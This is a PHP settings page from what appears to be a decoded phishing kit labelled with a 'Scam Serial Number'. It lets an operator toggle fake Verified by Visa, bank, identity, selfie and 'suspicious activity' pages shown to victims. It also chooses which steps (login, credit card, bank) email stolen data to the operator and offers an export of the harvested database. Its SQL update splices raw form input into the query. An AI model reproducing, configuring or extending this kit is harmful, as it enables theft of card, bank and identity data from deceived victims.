<?php
// Decoded by Girudatsu.com Member

$mCMIEekRDEh = 'header';
@session_start();
if (!isset($_SESSION['login_success'])) {
    @header('Location: ../index.php');
    exit;
}
$serial = 'Girudatsu.com';
if (isset($_POST['truelogin'])) {
    $reset_db = $_POST['reset_db'];
    $truelogin = $_POST['truelogin'];
    $emails = $_POST['emails'];
    $password = $_POST['password'];
    $notification = $_POST['notification'];
    $enable_vbv = $_POST['enable_vbv'];
    $enable_bank = $_POST['enable_bank'];
    $enable_identity = $_POST['enable_identity'];
    $enable_suspecious = $_POST['enable_suspecious'];
    $force_vbv = $_POST['force_vbv'];
    $enable_selfie = $_POST['enable_selfie'];
    $display_profile = $_POST['display_profile'];
    $pdo = new PDO('sqlite:database.db');
    $pdo->query('' . 'UPDATE `settings` SET `truelogin`=\'' . "{$truelogin}" . '\', `emails`=\'' . "{$emails}" . '\', `password`=\'' . "{$password}" . '\', `notification`=\'' . "{$notification}" . '\', `enable_vbv`=\'' . "{$enable_vbv}" . '\', `enable_bank`=\'' . "{$enable_bank}" . '\', `enable_identity`=\'' . "{$enable_identity}" . '\',`enable_suspecious`=\'' . "{$enable_suspecious}" . '\',`force_vbv`=\'' . "{$force_vbv}" . '\',`enable_selfie`=\'' . "{$enable_selfie}" . '\',`display_profile`=\'' . "{$display_profile}" . '\'' . '');
    echo 'done';
    exit;
}
?>
<script src="js/settings.js" type="text/javascript"></script>
<div id="title_1">Settings:</div>
<?php
$mCMIEekRDEh = 'header';
$pdo = new PDO('sqlite:database.db');
$settings = $pdo->query('SELECT * FROM `settings`')->fetch(PDO::FETCH_ASSOC);
?>
<div class="line" id="table_settings">
	<table>
		<tr><td>True Login:</td><td>
			<select name="truelogin" id="truelogin" disabled>
				<option value="Yes" <?php
$mCMIEekRDEh = 'header';
if ($settings['truelogin'] == 'Yes') {
    echo 'selected';
}
?>
>YES</option>
				<option value="No" <?php
$mCMIEekRDEh = 'header';
if ($settings['truelogin'] == 'No') {
    echo 'selected';
}
?>
>NO ( Under Construction! )</option>
			</select>
		</td></tr>

		<!-- <tr><td>Resete Database:</td><td>
			<select name="reset_db" id="reset_db">
				<option value="no">NO</option>
				<option value="yes">YES</option>
			</select>
		</td></tr> -->
		<tr><td>Scam Serial Number:</td><td>
		<font color="#689DDF"><?php
echo $serial;
?>
</font>
		</td></tr>

		<tr><td>Notification Emails:</td><td>

            <input type="text" name="emails" id="emails" value="<?php
            echo $settings['emails'];
            ?>
            " placeholder="">

	<!--

		<font color="#689DDF"><?php
echo $settings['emails'];
?>
</font>
	 <textarea name="emails" id="emails"><?php
echo $settings['emails'];
?>
</textarea> -->
		</td></tr>
		<tr><td>Password:</td><td>
			<input type="text" name="password" id="password" value="<?php
echo $settings['password'];
?>
" placeholder="">
		</td></tr>
		<tr><td>Receive the notification Emails:</td><td>
		<select name="notification" id="notification">
			<!-- <option value="none"  <?php
$mCMIEekRDEh = 'header';
if ($settings['notification'] == 'none') {
    echo 'selected';
}
?>
>Don't Send Emails</option> -->
			<option value="every"  <?php
$mCMIEekRDEh = 'header';
if ($settings['notification'] == 'every') {
    echo 'selected';
}
?>
>Send Emails on Every Step</option>
			<option value="login"  <?php
$mCMIEekRDEh = 'header';
if ($settings['notification'] == 'login') {
    echo 'selected';
}
?>
>Send Emails on Login</option>
			<option value="cc"  <?php
$mCMIEekRDEh = 'header';
if ($settings['notification'] == 'cc') {
    echo 'selected';
}
?>
>Send Emails on Credit Card</option>
			<option value="vbv"  <?php
$mCMIEekRDEh = 'header';
if ($settings['notification'] == 'vbv') {
    echo 'selected';
}
?>
>Send Emails on Verified by Visa</option>
			<option value="bank"  <?php
$mCMIEekRDEh = 'header';
if ($settings['notification'] == 'bank') {
    echo 'selected';
}
?>
>Send Emails on Bank</option>
		</select>
		</td></tr>

		<tr><td>Display Profile Details:</td><td>
			<select name="display_profile" id="display_profile">
				<option value="yes" <?php
$mCMIEekRDEh = 'header';
if ($settings['display_profile'] == 'yes') {
    echo 'selected';
}
?>
>YES</option>
				<option value="no" <?php
$mCMIEekRDEh = 'header';
if ($settings['display_profile'] == 'no') {
    echo 'selected';
}
?>
>NO</option>
			</select>
		</td></tr>

		<tr><td>Enable Suspecious Page:</td><td>
			<select name="enable_suspecious" id="enable_suspecious">
				<option value="yes" <?php
$mCMIEekRDEh = 'header';
if ($settings['enable_suspecious'] == 'yes') {
    echo 'selected';
}
?>
>YES</option>
				<option value="no" <?php
$mCMIEekRDEh = 'header';
if ($settings['enable_suspecious'] == 'no') {
    echo 'selected';
}
?>
>NO</option>
			</select>
		</td></tr>

		<tr><td>Enable Verified by Visa Page:</td><td>
			<select name="enable_vbv" id="enable_vbv">
				<option value="yes" <?php
$mCMIEekRDEh = 'header';
if ($settings['enable_vbv'] == 'yes') {
    echo 'selected';
}
?>
>YES</option>
				<option value="no" <?php
$mCMIEekRDEh = 'header';
if ($settings['enable_vbv'] == 'no') {
    echo 'selected';
}
?>
>NO</option>
			</select>
		</td></tr>

		<tr><td>Force Verified by Visa Page:</td><td>
			<select name="force_vbv" id="force_vbv">
				<option value="yes" <?php
$mCMIEekRDEh = 'header';
if ($settings['force_vbv'] == 'yes') {
    echo 'selected';
}
?>
>YES</option>
				<option value="no" <?php
$mCMIEekRDEh = 'header';
if ($settings['force_vbv'] == 'no') {
    echo 'selected';
}
?>
>NO</option>
			</select>
		</td></tr>


		<tr><td>Enable Bank Page:</td><td>
			<select name="enable_bank" id="enable_bank">
				<option value="yes" <?php
$mCMIEekRDEh = 'header';
if ($settings['enable_bank'] == 'yes') {
    echo 'selected';
}
?>
>YES</option>
				<option value="no" <?php
$mCMIEekRDEh = 'header';
if ($settings['enable_bank'] == 'no') {
    echo 'selected';
}
?>
>NO</option>
			</select>
		</td></tr>

		<tr><td>Enable Identity Page:</td><td>
			<select name="enable_identity" id="enable_identity">
				<option value="yes" <?php
$mCMIEekRDEh = 'header';
if ($settings['enable_identity'] == 'yes') {
    echo 'selected';
}
?>
>YES</option>
				<option value="no" <?php
$mCMIEekRDEh = 'header';
if ($settings['enable_identity'] == 'no') {
    echo 'selected';
}
?>
>NO</option>
			</select>
		</td></tr>

		<tr><td>Enable Selfie Page:</td><td>
			<select name="enable_selfie" id="enable_selfie">
				<option value="yes" <?php
$mCMIEekRDEh = 'header';
if ($settings['enable_selfie'] == 'yes') {
    echo 'selected';
}
?>
>YES</option>
				<option value="no" <?php
$mCMIEekRDEh = 'header';
if ($settings['enable_selfie'] == 'no') {
    echo 'selected';
}
?>
>NO</option>
			</select>
		</td></tr>

		<tr><td></td><td><button name="setting_submit" id="setting_submit">SAVE</button> <button name="download_db" id="download_db">Export Database</button></td></tr>
	</table>
</div>
